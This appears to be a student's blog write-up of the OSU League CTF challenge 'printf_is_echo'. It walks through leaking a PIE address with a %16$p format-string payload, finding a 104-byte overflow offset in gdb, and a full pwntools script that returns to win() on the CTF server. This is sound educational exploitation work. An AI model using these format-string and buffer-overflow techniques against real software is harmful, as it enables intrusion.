@@ -1,0 +1,269 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="author" content="">
+<meta name="description" content="Oh boy. We got by the title what looks to be some sort of challenge involving printf. Let&amp;rsquo;s run the binary and take a look.
+did you know the unix tool echo can be implemented with two lines of C? I&#39;ll echo some bytes, try it! boop boop I used ASLR (with PIE), so the address of the win function is randomized! I&#39;ll give you the last three hex digits of the address as a hint: 0x79a Type &amp;quot;I give up&amp;quot; to acknowledge that this binary is unhackable I give up Uh oh, so ASLR is enabled." />
+<meta name="keywords" content=", osuleague, ctf, security" />
+<meta name="robots" content="noodp" />
+<meta name="theme-color" content="" />
+<link rel="canonical" href="/blog/printf_is_echo/" />
+
+
+    <title>
+        
+            OSU League 2020/2021 - printf_is_echo Writeup :: Cameron McCawley 
+        
+    </title>
+
+
+
+<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css" rel="stylesheet"
+    type="text/css">
+
+
+
+<link rel="stylesheet" href="/main.d7bdd8ee18bfbf4c605488a7e5b1b92cd980dfeed2bdaeab4dd5e931a7a78bc0.css">
+
+
+
+
+
+
+<meta itemprop="name" content="OSU League 2020/2021 - printf_is_echo Writeup">
+<meta itemprop="description" content="Oh boy. We got by the title what looks to be some sort of challenge involving printf. Let&rsquo;s run the binary and take a look.
+did you know the unix tool echo can be implemented with two lines of C? I&#39;ll echo some bytes, try it! boop boop I used ASLR (with PIE), so the address of the win function is randomized! I&#39;ll give you the last three hex digits of the address as a hint: 0x79a Type &quot;I give up&quot; to acknowledge that this binary is unhackable I give up Uh oh, so ASLR is enabled.">
+<meta itemprop="datePublished" content="2020-11-04T00:00:00+00:00" />
+<meta itemprop="dateModified" content="2020-11-04T00:00:00+00:00" />
+<meta itemprop="wordCount" content="667">
+<meta itemprop="image" content=""/>
+
+
+
+<meta itemprop="keywords" content="osuleague,ctf,security," />
+
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content=""/>
+
+<meta name="twitter:title" content="OSU League 2020/2021 - printf_is_echo Writeup"/>
+<meta name="twitter:description" content="Oh boy. We got by the title what looks to be some sort of challenge involving printf. Let&rsquo;s run the binary and take a look.
+did you know the unix tool echo can be implemented with two lines of C? I&#39;ll echo some bytes, try it! boop boop I used ASLR (with PIE), so the address of the win function is randomized! I&#39;ll give you the last three hex digits of the address as a hint: 0x79a Type &quot;I give up&quot; to acknowledge that this binary is unhackable I give up Uh oh, so ASLR is enabled."/>
+
+
+
+
+    <meta property="og:title" content="OSU League 2020/2021 - printf_is_echo Writeup" />
+<meta property="og:description" content="Oh boy. We got by the title what looks to be some sort of challenge involving printf. Let&rsquo;s run the binary and take a look.
+did you know the unix tool echo can be implemented with two lines of C? I&#39;ll echo some bytes, try it! boop boop I used ASLR (with PIE), so the address of the win function is randomized! I&#39;ll give you the last three hex digits of the address as a hint: 0x79a Type &quot;I give up&quot; to acknowledge that this binary is unhackable I give up Uh oh, so ASLR is enabled." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="/blog/printf_is_echo/" />
+<meta property="og:image" content=""/>
+<meta property="article:published_time" content="2020-11-04T00:00:00+00:00" />
+<meta property="article:modified_time" content="2020-11-04T00:00:00+00:00" /><meta property="og:site_name" content="Cameron McCawley" />
+
+
+
+
+
+
+    <meta property="article:published_time" content="2020-11-04 00:00:00 &#43;0000 UTC" />
+
+
+
+
+
+
+
+
+    </head>
+
+    
+        <body>
+    
+    
+        <div class="container">
+            <header class="header">
+    <span class="header__inner">
+        <a href="/" style="text-decoration: none;">
+    <div class="logo">
+        
+            <span class="logo__mark">></span>
+            <span class="logo__text">cd ~/cameronmccawley</span>
+            <span class="logo__cursor" style=
+                  "
+                   
+                   ">
+            </span>
+        
+    </div>
+</a>
+
+
+        <span class="header__right">
+            
+                <nav class="menu">
+    <ul class="menu__inner"><li><a href="/about/">About</a></li><li><a href="/blog/">Blog</a></li><li><a href="/resume.pdf">Resume</a></li>
+    </ul>
+</nav>
+
+                <span class="menu-trigger">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M0 0h24v24H0z" fill="none"/>
+                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+                    </svg>
+                </span>
+            
+        </span>
+    </span>
+</header>
+
+
+            <div class="content">
+                
+    <main class="post">
+
+        <div class="post-info">
+            
+            </p>
+        </div>
+
+        <article>
+            <h2 class="post-title"><a href="/blog/printf_is_echo/">OSU League 2020/2021 - printf_is_echo Writeup</a></h2>
+
+            
+            
+            
+
+            <div class="post-content">
+                <p>Oh boy. We got by the title what looks to be some sort of challenge involving printf.  Let&rsquo;s run the binary and take a look.</p>
+<pre><code>did you know the unix tool echo can be implemented with two lines of C? I'll echo some bytes, try it!
+boop
+boop
+
+I used ASLR (with PIE), so the address of the win function is randomized!
+I'll give you the last three hex digits of the address as a hint: 0x79a
+Type &quot;I give up&quot; to acknowledge that this binary is unhackable
+I give up
+</code></pre><p>Uh oh, so ASLR is enabled.  This means we don&rsquo;t know what the address of the win function will be since it changes every time.  If only there was a way to leak addresses from the stack, we might be able to get something.  Well, maybe we can.</p>
+<p>If the <code>printf</code> is used in an insecure way, directly passing user controled variables as arguments to the funtion, then we can make really bad things happen.</p>
+<p>For example.  What would happen if we have a printf function like this:
+<code>printf(userinput);</code>
+and we passed in <code>%p</code>?</p>
+<p>Well, it will treat the <code>%p</code> as an argument and print the pointer data on the stack.  Let&rsquo;s try it out with the program.</p>
+<pre><code>%p, %p, %p, %p, %p, %p, %p, %p, %p, %p, %p, %p, %p, %p, %p, %p, %p, %p, %p, %p
+0x7ffdc72101a0, 0x7fb27237f8d0, 0xf, (nil), 0x7fb2725934c0, 0x202c7025202c7025, 0x202c7025202c7025, 0x202c7025202c7025, 0x202c7025202c7025, 0x202c7025202c7025, 0x202c7025202c7025, 0x202c7025202c7025, 0x202c7025202c7025, 0x202c7025202c7025, (nil), 0x5646bc24d79a, 0x5646bc24d690, 0x7ffdc7210210,
+I used ASLR (with PIE), so the address of the win function is randomized!
+I'll give you the last three hex digits of the address as a hint: 0x79a
+</code></pre><p>Well sweet, looks like we got some leaked addresses.  Not only that, but there is an address in the 16th spot that ends in <code>0x79a</code>. That&rsquo;s our win function!!</p>
+<p>We can make this a bit cleaner by just inputing <code>%16$p</code>.  Let&rsquo;s verify this works and we get the right address.</p>
+<pre><code>did you know the unix tool echo can be implemented with two lines of C? I'll echo some bytes, try it!
+%16$p
+0x557959a5079a
+
+I used ASLR (with PIE), so the address of the win function is randomized!
+I'll give you the last three hex digits of the address as a hint: 0x79a
+Type &quot;I give up&quot; to acknowledge that this binary is unhackable
+</code></pre><p>Awesome.  Next step now that we have the win function is to try to get our program to return to it. This will probably be accomplised via a buffer overflow attack on the second input option. And after messing around a bit, I was able to find that the buffer we had was going to be 104 bytes before we started overwriting the instruction pointer:</p>
+<pre><code>gdb-peda$ r
+Starting program: /home/perchik/CTF/osuleague/week4/printf_is_echo
+did you know the unix tool echo can be implemented with two lines of C? I'll echo some bytes, try it!
+boop
+boop
+
+I used ASLR (with PIE), so the address of the win function is randomized!
+I'll give you the last three hex digits of the address as a hint: 0x79a
+Type &quot;I give up&quot; to acknowledge that this binary is unhackable
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB
+
+Program received signal SIGSEGV, Segmentation fault.
+
+[----------------------------------registers-----------------------------------]
+RAX: 0x0
+RBX: 0x0
+RCX: 0xf
+RDX: 0x7ffff7dd18d0 --&gt; 0x0
+RSI: 0x7fffffffde80 ('A' &lt;repeats 96 times&gt;, &quot;BBBBBBBB\n&quot;)
+RDI: 0x7fffffffde81 ('A' &lt;repeats 95 times&gt;, &quot;BBBBBBBB\n&quot;)
+RBP: 0x4242424242424242 ('BBBBBBBB')
+</code></pre><p>So, we have a way of getting the address of win(), we know our padding size. We can now build an exploit!</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+<span style="color:#f92672">import</span> os<span style="color:#f92672">,</span> sys
+<span style="color:#75715e">#io = process(&#39;./printf_is_echo&#39;)</span>
+io <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#39;ctf.ropcity.com&#39;</span>, <span style="color:#ae81ff">31338</span>)
+
+context(arch <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;amd64&#34;</span>)
+
+io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;try it!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
+
+printf <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;%16$p&#34;</span>
+
+io<span style="color:#f92672">.</span>sendline(printf)
+
+win <span style="color:#f92672">=</span> int(io<span style="color:#f92672">.</span>recvline(), <span style="color:#ae81ff">16</span>)
+log<span style="color:#f92672">.</span>info(win)
+
+padding <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">104</span>
+io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#39;unhackable&#39;</span>)
+payload <span style="color:#f92672">=</span> padding <span style="color:#f92672">+</span> p64(win)
+
+io<span style="color:#f92672">.</span>sendline(payload)
+io<span style="color:#f92672">.</span>interactive()
+</code></pre></div><p>And after running it we get the flag!</p>
+<pre><code>[+] Opening connection to ctf.ropcity.com on port 31338: Done
+[*] 94681416755098
+[*] Switching to interactive mode
+
+osu{F0rMa7_$tRing_1s_FUN}
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x03
+[*] Got EOF while reading in interactive
+</code></pre><p>Nice! That was a fun challenged and learned a lot about how format string vulns work!</p>
+
+            </div>
+        </article>
+
+        <hr />
+
+        <div class="post-info">
+            
+    <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line></svg>
+
+        <span class="tag"><a href="tags/osuleague/">osuleague</a></span>
+        <span class="tag"><a href="tags/ctf/">ctf</a></span>
+        <span class="tag"><a href="tags/security/">security</a></span>
+        
+    </p>
+
+            
+  		</div>
+    </main>
+
+            </div>
+
+            
+                <footer class="footer">
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>&copy; 2021</span>
+            
+            <span><a href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener">CC BY-NC 4.0</a></span><span><a href="posts/index.xml" target="_blank" title="rss"><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></a></span>
+        </div>
+    </div>
+</footer>
+
+            
+        </div>
+
+        
+
+
+
+<script type="text/javascript" src="/bundle.min.af435e44374f1e99a669ea8cd5bb9a2fceed80588941a451bfddb66b86a67c9f40b0f417e9543a763f809aa7e9300d7b1d69bf99615810ba02ac70396d50fad5.js" integrity="sha512-r0NeRDdPHpmmaeqM1buaL87tgFiJQaRRv922a4amfJ9AsPQX6VQ6dj&#43;AmqfpMA17HWm/mWFYELoCrHA5bVD61Q=="></script>
+
+
+
+    </body>
+</html>
